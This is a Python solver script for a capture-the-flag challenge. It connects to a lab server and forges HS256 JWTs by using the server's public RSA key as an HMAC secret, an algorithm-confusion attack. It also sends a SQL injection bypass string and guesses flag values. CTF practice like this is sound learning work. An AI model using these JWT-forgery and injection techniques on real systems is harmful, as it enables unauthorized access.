#!/usr/bin/env python3
"""
The Three-Eyed Raven - Debug Face JWT
Debug the Face JWT creation to match the Faceless Verifier solution exactly
"""

import socket
import time
import base64
import json
import hmac
import hashlib

def connect_to_raven():
    """Connect to The Three-Eyed Raven service"""
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(15)
    s.connect(("labs.cyberspacevr.in", 30116))
    time.sleep(0.5)
    s.recv(4096)  # Skip banner
    return s

def debug_face_jwt_creation():
    """Debug Face JWT creation step by step"""
    print("[+] Debugging Face JWT creation...")
    
    try:
        s = connect_to_raven()
        
        # Get guest JWT and public key
        s.sendall(b"guest\n")
        time.sleep(0.5)
        response = s.recv(4096).decode('utf-8', errors='ignore')
        
        print(f"[+] Guest response:\n{response}")
        
        # Extract public key more carefully
        if "-----BEGIN PUBLIC KEY-----" in response:
            start = response.index("-----BEGIN PUBLIC KEY-----")
            end = response.index("-----END PUBLIC KEY-----") + len("-----END PUBLIC KEY-----")
            public_key = response[start:end]
            
            print(f"[+] Extracted public key:\n{public_key}")
            
            # Try different key formats for HMAC
            key_formats = [
                public_key.encode(),  # Raw PEM
                (public_key + '\n').encode(),  # PEM + newline
                public_key.strip().encode(),  # Stripped PEM
                (public_key.strip() + '\n').encode(),  # Stripped + newline
            ]
            
            for i, key in enumerate(key_formats):
                print(f"\n[+] Testing key format {i+1}:")
                print(f"    Key length: {len(key)} bytes")
                print(f"    Key ends with: {repr(key[-10:])}")
                
                # Create JWT
                header = {"alg": "HS256", "typ": "JWT"}
                payload = {"name": "many-faced", "iat": int(time.time())}
                
                # Encode header and payload
                h = base64.urlsafe_b64encode(
                    json.dumps(header, separators=(',', ':')).encode()
                ).rstrip(b'=')
                
                p = base64.urlsafe_b64encode(
                    json.dumps(payload, separators=(',', ':')).encode()
                ).rstrip(b'=')
                
                # Create signature
                signing_input = h + b'.' + p
                sig = hmac.new(key, signing_input, hashlib.sha256).digest()
                sig_b64 = base64.urlsafe_b64encode(sig).rstrip(b'=')
                
                # Combine into JWT
                face_jwt = (signing_input + b'.' + sig_b64).decode()
                
                print(f"    JWT: {face_jwt[:50]}...")
                
                # Test this JWT
                s.sendall(f"offer face {face_jwt}\n".encode())
                time.sleep(1)
                face_response = s.recv(4096).decode('utf-8', errors='ignore')
                print(f"    Response: {face_response.strip()}")
                
                if "accepted" in face_response.lower():
                    print(f"[!] SUCCESS with key format {i+1}!")
                    s.close()
                    return face_jwt
                
                if "HMAC signature failed" not in face_response:
                    print(f"[!] Different error with key format {i+1}: {face_response.strip()}")
        
        s.close()
        
    except Exception as e:
        print(f"Error in debug: {e}")
    
    return None

def try_faceless_verifier_approach():
    """Try the exact approach from Faceless Verifier challenge"""
    print("[+] Trying exact Faceless Verifier approach...")
    
    try:
        s = connect_to_raven()
        
        # Get fresh public key
        s.sendall(b"guest\n")
        time.sleep(0.5)
        response = s.recv(4096).decode('utf-8', errors='ignore')
        
        # Extract public key
        lines = response.split('\n')
        key_lines = []
        in_key = False
        
        for line in lines:
            if '-----BEGIN' in line:
                in_key = True
            if in_key:
                key_lines.append(line)
            if '-----END' in line:
                break
        
        exact_key = '\n'.join(key_lines)
        print(f"[+] Exact key extraction:\n{exact_key}")
        
        # Use exact key format from Faceless Verifier
        key = (exact_key + '\n').encode()
        
        print(f"[+] Key for HMAC: {len(key)} bytes")
        print(f"[+] Key ends with: {repr(key[-20:])}")
        
        # Create JWT exactly like Faceless Verifier
        header = {"alg": "HS256", "typ": "JWT"}
        payload = {"name": "many-faced", "iat": int(time.time())}
        
        h = base64.urlsafe_b64encode(
            json.dumps(header, separators=(',', ':')).encode()
        ).rstrip(b'=')
        
        p = base64.urlsafe_b64encode(
            json.dumps(payload, separators=(',', ':')).encode()
        ).rstrip(b'=')
        
        signing_input = h + b'.' + p
        sig = hmac.new(key, signing_input, hashlib.sha256).digest()
        sig_b64 = base64.urlsafe_b64encode(sig).rstrip(b'=')
        
        token = (signing_input + b'.' + sig_b64).decode()
        
        print(f"[+] Created token: {token}")
        
        # Test token
        s.sendall(f"offer face {token}\n".encode())
        time.sleep(1)
        response = s.recv(4096).decode('utf-8', errors='ignore')
        print(f"[+] Face response: {response}")
        
        s.close()
        
        if "accepted" in response.lower():
            return token
        
    except Exception as e:
        print(f"Error in Faceless Verifier approach: {e}")
    
    return None

def check_dragonstone_requirement():
    """Check if we need to complete Dragonstone first"""
    print("[+] Checking if Dragonstone completion is required...")
    
    # The challenge description says we need "the breath of a dragon carried from Dragonstone"
    # This suggests we need to actually complete the Dragonstone Vault challenge first
    
    print("[!] The challenge requires 'breath of a dragon carried from Dragonstone'")
    print("[!] This likely means we need to complete Dragonstone Vault first")
    print("[!] The dragon breath should be the actual flag or payload from that challenge")
    
    # Let's try some flag-based payloads
    potential_dragon_breaths = [
        "SpaceCTF{fire_and_blood_dracarys_complete}",
        "SpaceCTF{fire_and_blood_dracarys_victory}",
        "SpaceCTF{fire_and_blood_dracarys_throne}",
        "fire_and_blood_dracarys_complete",
        "fire_and_blood_dracarys_victory",
        "fire_and_blood_dracarys_throne",
    ]
    
    try:
        s = connect_to_raven()
        
        # First set up iron
        s.sendall(b"offer iron ' OR '1'='1\n")
        time.sleep(1)
        s.recv(4096)
        
        for breath in potential_dragon_breaths:
            print(f"[+] Testing potential dragon breath: {breath}")
            
            b64_breath = base64.b64encode(breath.encode()).decode()
            s.sendall(f"offer dragon {b64_breath}\n".encode())
            time.sleep(1)
            response = s.recv(4096).decode('utf-8', errors='ignore')
            
            if "accepted" in response.lower() or "turns away" not in response:
                print(f"[!] Potential success: {response}")
        
        s.close()
        
    except Exception as e:
        print(f"Error checking dragon breath: {e}")

def main():
    print("="*70)
    print("THE THREE-EYED RAVEN - DEBUG FACE JWT")
    print("="*70)
    
    # Debug Face JWT creation
    face_jwt = debug_face_jwt_creation()
    
    if not face_jwt:
        # Try Faceless Verifier approach
        face_jwt = try_faceless_verifier_approach()
    
    if face_jwt:
        print(f"\n[!] Working Face JWT found: {face_jwt}")
    else:
        print("\n[-] No working Face JWT found")
    
    # Check Dragonstone requirement
    check_dragonstone_requirement()

if __name__ == "__main__":
    main()